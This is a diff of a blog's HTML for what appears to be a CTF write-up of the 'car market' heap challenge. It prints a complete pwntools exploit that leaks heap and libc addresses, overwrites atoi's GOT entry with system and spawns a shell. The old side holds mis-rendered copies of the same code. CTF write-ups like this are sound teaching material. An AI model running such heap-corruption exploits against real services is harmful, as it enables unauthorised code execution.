@@ -276,19 +276,18 @@
 
 <p>64 bit ELF, with <strong>Partial RELRO, Canary &amp; NX enabled, no PIE</strong>. <code class="highlighter-rouge">libc.so</code> was provided.</p>
 
-<p>The binary is a car market program. It will let us list our cars’ info, add a car, remove a car and select a car. By selecting a car, we can edit our car model, price and add a customer. While adding a customer, we can set the customer’s name, comment and print out the customer’s info. The <code class="highlighter-rouge">car</code> and <code class="highlighter-rouge">customer</code> are defined as the following structures:<br />
-```c car
-struct car{
-  char model[16];
-  long price;
-  struct customer* customer;
-};</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>```c customer  
-struct customer{
-  char first_name[32];
-  char name[32];
-  char* comment; // buffer size: 0x48
-};
+<p>The binary is a car market program. It will let us list our cars’ info, add a car, remove a car and select a car. By selecting a car, we can edit our car model, price and add a customer. While adding a customer, we can set the customer’s name, comment and print out the customer’s info. The <code class="highlighter-rouge">car</code> and <code class="highlighter-rouge">customer</code> are defined as the following structures:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">car</span><span class="p">{</span>
+  <span class="kt">char</span> <span class="n">model</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+  <span class="kt">long</span> <span class="n">price</span><span class="p">;</span>
+  <span class="k">struct</span> <span class="n">customer</span><span class="o">*</span> <span class="n">customer</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div></div>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">customer</span><span class="p">{</span>
+  <span class="kt">char</span> <span class="n">first_name</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+  <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">comment</span><span class="p">;</span> <span class="c1">// buffer size: 0x48
+</span><span class="p">};</span>
 </code></pre></div></div>
 
 <p>After doing some reversing &amp; fuzzing, here’s some important program behavior:</p>
@@ -373,161 +372,158 @@ customer+64  |        0x12345680| char* comment
 
 <p>At last, when the program ask us to input our choice, we can input <code class="highlighter-rouge">sh\x00</code> and execute <code class="highlighter-rouge">system('sh')</code>, spawning a shell and get the flag…right?</p>
 
-<p>```python exp_car.py
-#!/usr/bin/env python</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
 
-<p>from pwn import *
-import subprocess
-import sys
-import time</p>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">time</span>
 
-<p>HOST = “car-market.asis-ctf.ir”
-PORT = 31337
-ELF_PATH = “./car_market”
-#LIBC_PATH = “/lib/x86_64-linux-gnu/libc.so.6”
-LIBC_PATH = “./car_libc.so.6”</p>
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"car-market.asis-ctf.ir"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">31337</span>
+<span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">"./car_market"</span>
+<span class="c">#LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"</span>
+<span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">"./car_libc.so.6"</span>
 
-<h1 id="setting">setting</h1>
-<p>context.arch = ‘amd64’
-context.os = ‘linux’
-context.endian = ‘little’
-context.word_size = 32
-context.log_level = ‘INFO’</p>
+<span class="c"># setting </span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span>
 
-<p>elf = ELF(ELF_PATH)
-libc = ELF(LIBC_PATH)</p>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">ELF_PATH</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">LIBC_PATH</span><span class="p">)</span>
 
-<p>def add_car(model, price):
-    r.sendlineafter(“&gt;\n”, “2”)
-    r.sendlineafter(“model\n”, model)
-    r.sendlineafter(“price\n”, str(price))</p>
+<span class="k">def</span> <span class="nf">add_car</span><span class="p">(</span><span class="n">model</span><span class="p">,</span> <span class="n">price</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"2"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"model</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">model</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"price</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">price</span><span class="p">))</span>
 
-<p>def sel_car_cust(idx, cust_zip):
-    r.sendlineafter(“&gt;\n”, “4”)
-    r.sendlineafter(“index\n”, str(idx))
-    r.sendlineafter(“&gt;\n”, “4”)</p>
+<span class="k">def</span> <span class="nf">sel_car_cust</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">cust_zip</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"index</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for (choice, data) in cust_zip:
-    r.sendlineafter("&gt;\n", str(choice))
-    r.sendlineafter(": \n", data)
+    <span class="k">for</span> <span class="p">(</span><span class="n">choice</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span> <span class="ow">in</span> <span class="n">cust_zip</span><span class="p">:</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">choice</span><span class="p">))</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+    
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c"># exit cust mode</span>
 
-r.sendlineafter("&gt;\n", "4") # exit cust mode
+<span class="k">def</span> <span class="nf">leak_heap</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"index</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c"># add cust</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"3"</span><span class="p">)</span> <span class="c"># add com</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"123"</span><span class="p">)</span> <span class="c"># input com</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c"># exit cust</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c"># add cust</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c"># exit cust</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span> <span class="c"># list</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Firstname : "</span><span class="p">)</span>
+    <span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0xb90</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"5"</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">heap_base</span>
+
+<span class="k">def</span> <span class="nf">leak_got</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"index</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Firstname : "</span><span class="p">)</span>
+    <span class="n">atoi_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"atoi_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">atoi_addr</span><span class="p">))</span>
+    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+=</span> <span class="n">atoi_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'atoi'</span><span class="p">]</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"5"</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+
+    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+    <span class="c">#r = process(ELF_PATH)</span>
+    
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">17</span><span class="p">):</span>
+        <span class="n">model</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s">"a"</span><span class="p">)</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span>
+        <span class="n">price</span> <span class="o">=</span> <span class="mi">100</span><span class="o">+</span><span class="n">i</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"add car: "</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">15</span><span class="p">:</span> <span class="c"># fake chunk</span>
+            <span class="n">model</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x51</span><span class="p">)</span>
+            <span class="n">price</span> <span class="o">=</span> <span class="mh">0x1111</span>
+        <span class="n">add_car</span><span class="p">(</span><span class="n">model</span><span class="p">,</span> <span class="n">price</span><span class="p">)</span>
+
+    <span class="c"># leak heap base</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"leaking heap base..."</span><span class="p">)</span>
+    <span class="n">heap_base</span> <span class="o">=</span> <span class="n">leak_heap</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"heap_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">))</span>
+
+    <span class="c"># overflow one byte of heap address</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"overflowing heap address..."</span><span class="p">)</span>
+    <span class="n">choice</span> <span class="o">=</span> <span class="p">[</span><span class="mi">3</span><span class="p">,</span> <span class="mi">1</span><span class="p">]</span>
+    <span class="n">data</span>   <span class="o">=</span> <span class="p">[</span><span class="s">"comment"</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">33</span><span class="p">]</span>
+    <span class="n">sel_car_cust</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="nb">zip</span><span class="p">(</span><span class="n">choice</span><span class="p">,</span> <span class="n">data</span><span class="p">))</span>   
+    
+    <span class="c"># add comment and overwrite customer pointer, change it to atoi@got.plt</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"modifying car 15 struct (for leaking got)..."</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c"># add customer</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"3"</span><span class="p">)</span> <span class="c"># add comment</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1111</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'atoi'</span><span class="p">]))</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c"># exit customer menu</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"5"</span><span class="p">)</span> <span class="c"># exit select car menu</span>
+    
+    <span class="c"># leak atoi's got</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"leaking atoi's got &amp; libc base..."</span><span class="p">)</span>
+    <span class="n">leak_got</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
+    <span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"libc base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"system: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
+
+    <span class="c"># overwrite customer pointer to heap_base+0x10</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"modifying car 15 struct (for corrupting car array)..."</span><span class="p">)</span>
+    <span class="n">choice</span> <span class="o">=</span> <span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+    <span class="n">data</span>   <span class="o">=</span> <span class="p">[</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x1111</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)]</span>
+    <span class="n">sel_car_cust</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="nb">zip</span><span class="p">(</span><span class="n">choice</span><span class="p">,</span> <span class="n">data</span><span class="p">))</span>   
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"5"</span><span class="p">)</span> <span class="c"># exit select car menu</span>
+
+    <span class="c"># free &amp; reallocate heap_base+0x10 , now we can control the car array </span>
+    <span class="c"># after we control the car array, overite car[14] and make it point to atoi's got</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"modifying car array..."</span><span class="p">)</span>
+    <span class="n">choice</span> <span class="o">=</span> <span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+    <span class="n">data</span>   <span class="o">=</span> <span class="p">[</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x20</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'atoi'</span><span class="p">])]</span>
+    <span class="n">sel_car_cust</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="nb">zip</span><span class="p">(</span><span class="n">choice</span><span class="p">,</span> <span class="n">data</span><span class="p">))</span>   
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"5"</span><span class="p">)</span> <span class="c"># exit select car menu</span>
+    
+    <span class="c"># overwrite atoi's got</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"overwriting atoi's got..."</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c"># select car</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"index</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"14"</span><span class="p">)</span> <span class="c"># input index</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"2"</span><span class="p">)</span> <span class="c"># set model (atoi's got)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"model</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"get shell !"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
 </code></pre></div></div>
 
-<p>def leak_heap(idx):
-    r.sendlineafter(“&gt;\n”, “4”)
-    r.sendlineafter(“index\n”, str(idx))
-    r.sendlineafter(“&gt;\n”, “4”) # add cust
-    r.sendlineafter(“&gt;\n”, “3”) # add com
-    r.sendlineafter(“: \n”, “123”) # input com
-    r.sendlineafter(“&gt;\n”, “4”) # exit cust
-    r.sendlineafter(“&gt;\n”, “4”) # add cust
-    r.sendlineafter(“&gt;\n”, “4”) # exit cust
-    r.sendlineafter(“&gt;\n”, “1”) # list
-    r.recvuntil(“Firstname : “)
-    heap_base = u64(r.recvline().strip().ljust(8, “\x00”)) - 0xb90
-    r.sendlineafter(“&gt;\n”, “5”)</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>return heap_base
-</code></pre></div></div>
-
-<p>def leak_got(idx):
-    r.sendlineafter(“&gt;\n”, “4”)
-    r.sendlineafter(“index\n”, str(idx))
-    r.sendlineafter(“&gt;\n”, “1”)
-    r.recvuntil(“Firstname : “)
-    atoi_addr = u64(r.recv(6).ljust(8, “\x00”))
-    log.success(“atoi_addr: “+hex(atoi_addr))
-    libc.address += atoi_addr - libc.symbols[‘atoi’]
-    r.sendlineafter(“&gt;\n”, “5”)</p>
-
-<p>if <strong>name</strong> == “<strong>main</strong>”:</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">r</span> <span class="p">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
-<span class="p">#</span><span class="n">r</span> <span class="p">=</span> <span class="n">process</span><span class="p">(</span><span class="n">ELF_PATH</span><span class="p">)</span>
-
-<span class="n">for</span> <span class="n">i</span> <span class="k">in</span> <span class="n">xrange</span><span class="p">(</span><span class="m">17</span><span class="p">):</span>
-    <span class="k">model</span> <span class="p">=</span> <span class="n">chr</span><span class="p">(</span><span class="n">ord</span><span class="p">(</span><span class="s2">"a"</span><span class="p">)+</span><span class="n">i</span><span class="p">)*</span><span class="m">4</span>
-    <span class="n">price</span> <span class="p">=</span> <span class="m">100</span><span class="p">+</span><span class="n">i</span>
-    <span class="nb">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"add car: "</span><span class="p">+</span><span class="n">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
-    <span class="k">if</span> <span class="n">i</span> <span class="p">==</span> <span class="m">15</span><span class="p">:</span> <span class="p">#</span> <span class="n">fake</span> <span class="n">chunk</span>
-        <span class="k">model</span> <span class="p">=</span> <span class="n">p64</span><span class="p">(</span><span class="m">0</span><span class="p">)</span> <span class="p">+</span> <span class="n">p64</span><span class="p">(</span><span class="m">0x51</span><span class="p">)</span>
-        <span class="n">price</span> <span class="p">=</span> <span class="m">0x1111</span>
-    <span class="n">add_car</span><span class="p">(</span><span class="k">model</span><span class="p">,</span> <span class="n">price</span><span class="p">)</span>
-
-<span class="p">#</span> <span class="n">leak</span> <span class="n">heap</span> <span class="n">base</span>
-<span class="nb">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"leaking heap base..."</span><span class="p">)</span>
-<span class="n">heap_base</span> <span class="p">=</span> <span class="n">leak_heap</span><span class="p">(</span><span class="m">16</span><span class="p">)</span>
-<span class="nb">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s2">"heap_base: "</span><span class="p">+</span><span class="n">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">))</span>
-
-<span class="p">#</span> <span class="n">overflow</span> <span class="n">one</span> <span class="n">byte</span> <span class="k">of</span> <span class="n">heap</span> <span class="n">address</span>
-<span class="nb">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"overflowing heap address..."</span><span class="p">)</span>
-<span class="n">choice</span> <span class="p">=</span> <span class="p">[</span><span class="m">3</span><span class="p">,</span> <span class="m">1</span><span class="p">]</span>
-<span class="n">data</span>   <span class="p">=</span> <span class="p">[</span><span class="s2">"comment"</span><span class="p">,</span> <span class="s2">"A"</span><span class="p">*</span><span class="m">33</span><span class="p">]</span>
-<span class="n">sel_car_cust</span><span class="p">(</span><span class="m">16</span><span class="p">,</span> <span class="n">zip</span><span class="p">(</span><span class="n">choice</span><span class="p">,</span> <span class="n">data</span><span class="p">))</span>   
-
-<span class="p">#</span> <span class="n">add</span> <span class="n">comment</span> <span class="k">and</span> <span class="n">overwrite</span> <span class="n">customer</span> <span class="n">pointer</span><span class="p">,</span> <span class="n">change</span> <span class="n">it</span> <span class="k">to</span> <span class="n">atoi</span><span class="p">@</span><span class="n">got</span><span class="p">.</span><span class="n">plt</span>
-<span class="nb">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"modifying car 15 struct (for leaking got)..."</span><span class="p">)</span>
-<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">"&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"4"</span><span class="p">)</span> <span class="p">#</span> <span class="n">add</span> <span class="n">customer</span>
-<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">"&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"3"</span><span class="p">)</span> <span class="p">#</span> <span class="n">add</span> <span class="n">comment</span>
-<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">": </span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="m">0x1111</span><span class="p">)</span> <span class="p">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s1">'atoi'</span><span class="p">]))</span>
-<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">"&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"4"</span><span class="p">)</span> <span class="p">#</span> <span class="k">exit</span> <span class="n">customer</span> <span class="n">menu</span>
-<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">"&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"5"</span><span class="p">)</span> <span class="p">#</span> <span class="k">exit</span> <span class="n">select</span> <span class="n">car</span> <span class="n">menu</span>
-
-<span class="p">#</span> <span class="n">leak</span> <span class="n">atoi</span><span class="s1">'s got
-log.info("leaking atoi'</span><span class="n">s</span> <span class="n">got</span> <span class="p">&amp;</span> <span class="n">libc</span> <span class="n">base</span><span class="p">...</span><span class="s2">")
-leak_got(15)
-system = libc.symbols['system']
-log.success("</span><span class="n">libc</span> <span class="n">base</span><span class="p">:</span> <span class="s2">"+hex(libc.address))
-log.success("</span><span class="nf">system</span><span class="p">:</span> <span class="s2">"+hex(system))
-
-# overwrite customer pointer to heap_base+0x10
-log.info("</span><span class="n">modifying</span> <span class="n">car</span> <span class="m">15</span> <span class="n">struct</span> <span class="p">(</span><span class="n">for</span> <span class="n">corrupting</span> <span class="n">car</span> <span class="k">array</span><span class="p">)...</span><span class="s2">")
-choice = [3]
-data   = [p64(0x1111) + p64(heap_base+0x10)]
-sel_car_cust(16, zip(choice, data))   
-r.sendlineafter("</span><span class="p">&gt;\</span><span class="n">n</span><span class="s2">", "</span><span class="m">5</span><span class="s2">") # exit select car menu
-
-# free &amp; reallocate heap_base+0x10 , now we can control the car array 
-# after we control the car array, overite car[14] and make it point to atoi's got
-log.info("</span><span class="n">modifying</span> <span class="n">car</span> <span class="k">array</span><span class="p">...</span><span class="s2">")
-choice = [3]
-data   = ["</span><span class="n">A</span><span class="s2">"*0x20+p64(elf.got['atoi'])]
-sel_car_cust(15, zip(choice, data))   
